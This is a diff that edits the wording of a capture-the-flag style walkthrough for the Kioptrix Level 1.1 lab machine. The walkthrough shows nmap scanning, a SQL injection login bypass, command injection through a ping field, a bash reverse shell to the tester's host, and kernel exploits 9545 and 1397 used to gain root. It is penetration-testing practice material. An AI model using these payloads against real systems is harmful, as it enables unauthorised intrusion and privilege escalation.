@@ -1,26 +1,26 @@
-# OSCP Vulnhub Set 1 - Kioptrix: Level 1.1 (#2)
+﻿# OSCP Vulnhub Set 1 - Kioptrix: Level 1.1 (#2)
 
-lab link: http://ccmtlab.ccmt.home.arpa:8888/user/missions/boxes?uuid=310958ee-e03d-4545-bcf0-f5de26a76405
+Lab link: http://ccmtlab.ccmt.home.arpa:8888/user/missions/boxes?uuid=310958ee-e03d-4545-bcf0-f5de26a76405
 
-target ip: `10.101.85.12`
+Target IP: `10.101.85.12`
 
 ---
 
 ## Scanning and Enumeration
 
-### nmap
+### Nmap
 
-find the service that running on that target ip.
+Identify the services running on the target IP.
 
 ```
 nmap -A -sC -sV 10.101.85.12
 ```
 
-- -A : Aggressive Scan
-- -sC : Default Script Scan
-- -sV : Version Detection
+- `-A`: Aggressive scan
+- `-sC`: Default script scan
+- `-sV`: Version detection
 
-found ssh, http and etc. that running on terget ip.
+The scan identified SSH, HTTP, RPC, SSL, CUPS, and an unauthorized MySQL service.
 
 ```
 ┌──(kali㉿kali)-[~/Desktop/ccmtlab/02]
@@ -87,23 +87,23 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 17.39 seconds
 ```
 
-let's explore.
+Based on service enumeration, HTTP and command execution are the most promising attack vectors.
 
 ---
 
-### http explore
+### HTTP Exploration
 
-open the target ip in browser to find the way to enter the target machine.
+Open the target web interface in a browser.
 
 ```
 http://10.101.85.12
 ```
 
-it's login page, that quite interesting.
+The page displays a login screen.
 
 ![](./images/01.png)
 
-i look at the page source, but nothing useful now.
+The page source shows a simple form.
 
 ```
 <html>
@@ -133,35 +133,36 @@ i look at the page source, but nothing useful now.
 	</table>
 </form>
 
-<!-- Start of HTML when logged in as Administator -->
+<!-- Start of HTML when logged in as Administrator -->
 </body>
 </html>
 ```
-i think i should try sql injection for login to this site.
+
+This login form suggests SQL injection may be possible.
 
 ---
 
 ## Exploitation
 
-### sql injection
+### SQL Injection
 
-let's use the most popular payload first, put it into username and password.
+Test login bypass using a common SQL injection payload.
 
 ```
 ' or 1=1 --
 ```
 
-it's success, i can bypass login to this site.
+The payload succeeded, allowing login bypass.
 
 ![](./images/02.png)
 
-i'll test this feature by entering my ip into the field and hitting submit.
+After bypassing authentication, a ping feature was available. I tested it by entering my IP address.
 
 ```
 10.101.55.75
 ```
 
-this feature can ping to my ip, interesting.
+The application pinged the host successfully.
 
 ```
 10.101.55.75
@@ -174,26 +175,25 @@ PING 10.101.55.75 (10.101.55.75) 56(84) bytes of data.
 --- 10.101.55.75 ping statistics ---
 3 packets transmitted, 3 received, 0% packet loss, time 2002ms
 rtt min/avg/max/mdev = 2.395/2.922/3.654/0.534 ms, pipe 2
-
 ```
 
-i think i can use command chaining.
+The ping input appears to accept additional shell commands.
 
 ---
 
-### command chaining
+### Command Chaining
 
-let's try to add more command into that field.
+Append a shell command to the ping input using a semicolon.
 
 ```
 10.101.55.75; id
 ```
 
-- use `10.101.55.75` to ping my ip
-- use `;` to command chaining
-- use `id` to identify target user
+- `10.101.55.75` triggers the ping command.
+- `;` separates the additional command.
+- `id` reveals the current user.
 
-it's work, command `id` is executed and the output show `uid=48(apache) gid=48(apache) groups=48(apache)`.
+The command executed successfully, showing the web server user.
 
 ```
 10.101.55.75; id
@@ -207,33 +207,33 @@ PING 10.101.55.75 (10.101.55.75) 56(84) bytes of data.
 3 packets transmitted, 3 received, 0% packet loss, time 2002ms
 rtt min/avg/max/mdev = 1.727/2.102/2.606/0.373 ms, pipe 2
 uid=48(apache) gid=48(apache) groups=48(apache)
-
 ```
 
-that's mean i can also execute another command, such as reverse shell.
+This confirms remote command execution as the `apache` user.
 
 ---
 
-### reverse shell
+### Reverse Shell
 
-i'll try to get reverse shell, search this page for payload.
+Search for a Bash reverse shell payload.
+
 ```
 https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 ```
 
-create listener on `kali`.
+Start a listener on Kali.
 
 ```
 rlwrap nc -lvp 1234
 ```
 
-let's try payload for `bash`, use it with command chaining.
+Inject a reverse shell command through the vulnerable field.
 
 ```
 10.101.55.75; bash -i >& /dev/tcp/10.101.55.75/1234 0>&1
 ```
 
-success, now i have reverse shell.
+The target opened a reverse shell.
 
 ```
 ┌──(kali㉿kali)-[~/Desktop/ccmtlab/02]
@@ -245,47 +245,42 @@ bash: no job control in this shell
 bash-3.00$ 
 ```
 
-let's privilege escalation
+The shell is now available for further enumeration.
 
 ---
 
 ## Privilege Escalation
 
-### system enumeration
+### System Enumeration
 
-i'll use this script to do system enumeration.
+Use an automated enumeration script to identify the operating system and kernel.
 
 ```
 https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh
 ```
 
-download it into `kali`.
+Download the script on Kali.
 
 ```
 wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/refs/heads/master/lse.sh
 ```
 
-i want to send it to target machine, let's open a local web server to host the file.
+Host the file locally and retrieve it from the target.
 
 ```
 python3 -m http.server 80
 ```
 
-move to `/tmp` because it has write permissions and download the script to target.
+On the target, move to `/tmp`, download the script, and execute it.
 
 ```
 cd /tmp
 wget http://10.101.55.75/lse.sh
-```
-
-make it executable, then run it.
-
-```
 chmod 777 lse.sh
 ./lse.sh
 ```
 
-it’s `centos 4.5` and `linux 2.6.9`.
+The enumeration output identified a CentOS 4.5 system running Linux kernel 2.6.9.
 
 ```
 bash-3.00$ ./lse.sh
@@ -308,33 +303,28 @@ Distribution: CentOS release 4.5 (Final)
 Architecture: i686
 ```
 
-now, i want to search for the exploit for this machine
+This suggests a local kernel exploit may be effective.
 
 ---
 
-### exploit 1397
+### Exploit 1397
 
-i google it to find the exploit, then i found this document.
+Search for a matching kernel exploit on Exploit-DB.
 
 ```
 https://www.exploit-db.com/exploits/1397
 ```
 
-download exploit by `searchsploit`.
+Download and compile the exploit on the target.
 
 ```
 searchsploit -m 1397
-```
-
-download to target machine, then excute it.
-
-```
 wget http://10.101.55.75/1397.c
 gcc -o k-rad3 1397.c -static -O2
 ./k-rad3 -t 1 -p 2
 ```
 
-fail, i think i miss something.
+The exploit did not succeed, indicating the kernel is not vulnerable to this exact payload.
 
 ```
 bash-3.00$ wget http://10.101.55.75/1397.c
@@ -372,29 +362,24 @@ let's search for another exploit.
 
 ---
 
-### exploit 9545
+### Exploit 9545
 
-i found another exploit in this document, this seems to match the target machine distribution better than the previous one.
+A second exploit matched the target distribution more closely.
 
 ```
 https://www.exploit-db.com/exploits/9545
 ```
 
-let's try again, download it to `kali`
+Download and compile it on the target.
 
 ```
 searchsploit -m 9545
-```
-
-download to target machine, then excute it.
-
-```
 wget http://10.101.55.75/9545.c
 gcc -Wall -o linux-sendpage 9545.c
 ./linux-sendpage
 ```
 
-now, i'm root.
+This exploit succeeded and elevated privileges to root.
 
 ```
 bash-3.00$ wget http://10.101.55.75/9545.c
@@ -415,4 +400,3 @@ sh: no job control in this shell
 sh-3.00# id
 uid=0(root) gid=0(root) groups=48(apache)
 ```
-
